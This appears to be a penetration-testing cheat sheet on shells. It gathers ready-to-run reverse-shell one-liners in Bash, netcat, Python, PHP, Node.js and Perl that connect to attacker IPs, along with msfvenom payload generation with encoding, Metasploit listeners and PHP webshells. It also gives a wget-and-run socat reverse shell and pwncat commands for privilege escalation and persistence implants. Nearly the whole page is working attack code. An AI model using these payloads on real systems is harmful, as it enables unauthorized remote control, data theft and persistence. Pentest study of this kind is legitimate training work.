---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Shells

## Reverse Shells

{% hint style="success" %}
Automated reverse shell code:

* [Reverse Shell Generator](https://www.revshells.com/) (online)
* [Revshellgen](https://github.com/t0thkr1s/revshellgen) (offline)
{% endhint %}

{% tabs %}
{% tab title="msfvenom" %}
For Windows targets:

{% code overflow="wrap" %}
```bash
# Staged
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=80 -e x86/shikata_ga_nai -f exe -o staged_meterpreter_80.exe

# Non-staged
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.X LPORT=4444 -e x86/shikata_ga_nai -f exe -o non_staged_4444.exe

# Listener
$ sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 80; set exitonsession false; run;"

# Execute
meterpreter > execute -f cmd.exe -a "/c start /b C:\\Windows\\Temp\\agent.exe -connect 10.10.14.5:443 -ignore-cert" -H
```
{% endcode %}

For Linux targets:

{% code overflow="wrap" %}
```bash
# Staged
$ msfvenom -p linux/x64/meterpreter/reverse_tcp  LHOST=10.10.14.5 LPORT=80 -f elf -o staged_meterpreter_80

# Listener
$ sudo msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 80; set exitonsession false; run;"

# Execute payload from the target (background, session-detached, silence output)
nohup ./staged_meterpreter_80 > /dev/null 2>&1 &
```
{% endcode %}
{% endtab %}

{% tab title="Bash" %}
```bash
bash -i >& /dev/tcp/10.10.10.10/9001 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.13 1337 >/tmp/f'
```
{% endtab %}

{% tab title="Netcat" %}
```bash
/bin/nc -nv 192.168.X.155 9090 -e /bin/bash
```
{% endtab %}

{% tab title="Python" %}
Create a socket, connect to the listener, duplicate the input, output, and error descriptors and call `/bin/sh` with `subprocess`:

{% code overflow="wrap" %}
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.X.155",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
{% endcode %}
{% endtab %}

{% tab title="PHP" %}
The below commands instruct PHP to run (`-r`) the command within quotes:

{% code overflow="wrap" %}
```bash
php -r '$sock=fsockopen("192.168.X.155",9090);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.X.155",9090);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.X.155",9090);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.X.155",9090);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.X.155",9090);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```
{% endcode %}
{% endtab %}

{% tab title="Node.js" %}
The initial command injection places a malicious file in a world-writable directory (`/var/tmp`) that calls upon `child_process` and `exec()` functions:

{% code overflow="wrap" %}
```bash
echo "require('child_process').exec('nc -nv 192.168.X.155 9090 -e /bin/bash')" > /var/tmp/offsec.js ; node /var/tmp/offsec.js
```
{% endcode %}
{% endtab %}

{% tab title="Perl" %}
Imports the `Socket` module, set up the socket, and pass it into a socket call. It then initializes the TCP connection (`connect()`), open channels for `STDIN`, `STDOUT`, and `STDERR`, and calls `/bin/bash`:

{% code overflow="wrap" %}
```bash
perl -e 'use Socket;$i="192.168.45.155";$p=9090;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Webshells

{% hint style="success" %}
Kali has various webshells under `/usr/share/webshells`.
{% endhint %}

{% tabs %}
{% tab title="PHP" %}
```php
# Predefined
<?php system("whoami"); ?>
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>

# Dynamic
?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
```
{% endtab %}

{% tab title="Weevely3" %}
[Weaponized Webshell](https://github.com/epinna/weevely3):

```bash
# Generate the webshell
./weevely.py generate test123 ~/dvwa/weevely.php

# Call the webshell
sudo weevely.py <URL>/weevely.php test123
```
{% endtab %}
{% endtabs %}

## Listeners

{% tabs %}
{% tab title="nc" %}
Set up the listener on the attacking host:

```bash
nc -lvnp <port>
```
{% endtab %}

{% tab title="Socat" %}
Set up the listener on the attacking host:

```bash
socat file:'tty',raw,echo=0 tcp-listen:4444
```

Send the reverse shell from the target:

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ip>:4444
```

Download and send the revershe shell from the target in one-line:

{% code overflow="wrap" %}
```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
{% endcode %}
{% endtab %}

{% tab title="Pwncat" %}
General syntax:

```bash
[protocol://][user[:password]]@[host:][port][?arg1=value&arg2=value]
```

Set up the listener on the attacking host:

```bash
# Pwncat syntax
pwncat-cs bind://0.0.0.0:<port>

# nc syntax
pwncat-cs -lp <port>

# Encrypt traffic
pwncat-cs ssl-bind://0.0.0.0:<port>
```

Connect to a bind shell:

```bash
# Pwncat syntax
pwncat-cs connect://<ip:port>

# nc syntax
pwncat-cs <ip>:<port>

# Encrypt traffic
pwncat-cs ssl-connect://<ip>:<port>
```

Connect to a remote SSH server:

```bash
# Via ssh
pwncat-cs "ssh://<user>:<pass>@<ip>

# ssh syntax
pwncat-cs <user>@<ip>

# Key authentication
pwncat-cs -i ./id_rsa <user>@<ip>
```

Connect to a Windows target:

```bash
# Full connection string
pwncat-cs -m windows connect://192.168.1.1:4444

# nc syntax
pwncat-cs -m windows 192.168.1.1 4444
```

Switch between `local` and `remote` modes:

```bash
# CTRL+D
(local) pwncat$

# CTRL+D
(remote) www-data@p-web-02.acme-infinity-servers.com:/var/www/html$

# CTRL+D
(local) pwncat$
```

File transfers:

```bash
# Download a file
download /etc/hosts ./victim-hosts

# Upload a file
upload ./malicious.sh /tmp/definitely-not-malicious
```

Enumreate from `local` mode:

```bash
# List enumeration modules
(local) pwncat$ search enumerate*

# Use all modules
(local) pwncat$ run enumerate

# Generate a markdown report
(local) pwncat$ run report output=report.md
```

Escalate privileges:

```bash
# List escalation paths for any user
(local) pwncat$ escalate list

# List escalation paths to the specified user
(local) pwncat$ escalate list -u <user>

# Escalate to root
(local) pwncat$ escalate run

# Escalate to the specified user
(local) pwncat$ escalate run -u <user>
```

Persistence:

{% code overflow="wrap" %}
```bash
# List implant methods
(local) pwncat$ search implant*

# List installed implants
(local) pwncat$ run implant list

# Escalate using an installed implant
(local) pwncat$ run implant escalate

# Remove implant
(local) pwncat$ run implant remove

# List all installed remote implants
pwncat-cs --list

# Reconnect using the implanet ID
pwncat-cs <implant-id>
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Upgrades

{% hint style="success" %}
* An upgraded shell gives us the ability to interrupt a process (`CTRL+C`), tab completion, clear the screen, up and down arrows, text editing, etc.
* `tty` stands for teletype and `pty` stands for pseudoterminal!
{% endhint %}

{% tabs %}
{% tab title="Python" %}
```bash
# Check if Python3 is installed on the target
which python3

# Spawn Bash via Python3
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Send tty to the backgroup (CTRL+Z) and check terminal's type and dimensions
echo $TERM && stty size

# Disable echo, send I/O straight through, and bring process to foreground
stty raw -echo; fg

# Press enter, reset terminal, and input the terminal type (xterm/screen)
reset

# Match tty's dimensions to the host's dimensions
stty rows 51 cols 209

# Set the TERM variable to the terminal's type
export TERM=xterm
```
{% endtab %}

{% tab title="Script" %}
```bash
# Check if Script is installed on the target
which script

# Spawn Bash via Script
script /dev/null -c /bin/bash

# Send tty to the backgroup (CTRL+Z) and check terminal's type and dimensions
echo $TERM && stty size

# Disable echo, send I/O straight through, and bring process to foreground
stty raw -echo; fg

# Press enter, reset terminal, and input the terminal type (xterm/screen)
reset

# Match tty's dimensions to the host's dimensions
stty rows 51 cols 209

# Set the TERM variable to the terminal's type
export TERM=xterm
```
{% endtab %}

{% tab title="Socat" %}
An upgraded shell can be spawn right away if `socat` is on the target host.&#x20;

Set up a listener from the attacking host:

```bash
socat file:$(tty),raw,echo=0 tcp-listen:1337
```

On the target host:

```bash
# Check if socat exists
which socat

# Send the reverse shell
socat exec:'bash -li',pty,stderr tcp:<attacker-ip>:<port>
```
{% endtab %}
{% endtabs %}
